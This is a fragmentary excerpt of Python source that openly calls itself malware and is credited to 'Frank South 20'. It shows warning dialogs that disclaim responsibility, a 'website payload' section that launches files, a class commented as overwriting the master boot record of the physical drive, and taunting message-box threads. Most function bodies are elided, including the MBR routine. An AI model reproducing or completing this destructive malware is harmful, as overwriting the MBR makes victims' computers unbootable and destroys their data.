...
def warning():
	if MessageBox("The software you just executed is considered a malware.If you don't know what a malware is then press simply No and nothing will happen.", "Frank South 20", MB_YESNO | MB_ICONWARNING) == 7: 
		exit()
	if MessageBox("This is the last warnin.The creator Frank South 20 is not responsible for any damage caused using this malware.Continue?", "Frank South 20", MB_YESNO | MB_ICONWARNING) == 7:
		exit()
#Website payload 
class Data:
	sites = (
...
time.sleep(1)
os.startfile(f'{e}')
# Overwrite the MBR on the phisycall drive 
class MBR:
	def overwrite():
...
def msgboxThread():
	MessageBox("still using this computer?", "Frank South 20", MB_OK | MB_ICONWARNING)
